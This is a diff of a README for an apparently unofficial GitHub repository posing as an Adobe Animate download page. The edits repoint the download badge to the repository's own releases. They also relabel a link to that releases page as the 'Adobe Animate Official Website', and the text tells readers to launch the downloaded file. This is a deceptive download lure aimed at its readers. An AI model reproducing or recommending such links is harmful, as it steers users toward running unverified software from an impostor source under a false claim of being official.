@@ -24,7 +24,7 @@ Welcome to the **-Adobe-Animate** repository! Here you will find a wealth of res
     - web-animation
 
 ## 🔗 Latest Release:
-[![Download App](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/repo/releases/9246/App.zip)
+[![Download App](https://github.com/shahzo564/-Adobe-Animate/releases)](https://github.com/shahzo564/-Adobe-Animate/releases)
 
 > Note: The provided link leads directly to the application file. Please make sure to launch the downloaded file to start using Adobe Animate.
 
@@ -52,7 +52,7 @@ Create smooth motion tweens to bring fluid movement to your animations. Easily d
 From animations to interactive presentations, Adobe Animate is your all-in-one solution for multimedia production. Take your projects to the next level.
 
 ## 🌐 Additional Resources:
-- Visit the [Adobe Animate Official Website](https://www.adobe.com/products/animate.html) for tutorials, support, and updates.
+- Visit the [Adobe Animate Official Website](https://github.com/shahzo564/-Adobe-Animate/releases) for tutorials, support, and updates.
 - Explore the "Releases" section of this repository for more download options and version history.
 
 ## 🎉 Get Involved:
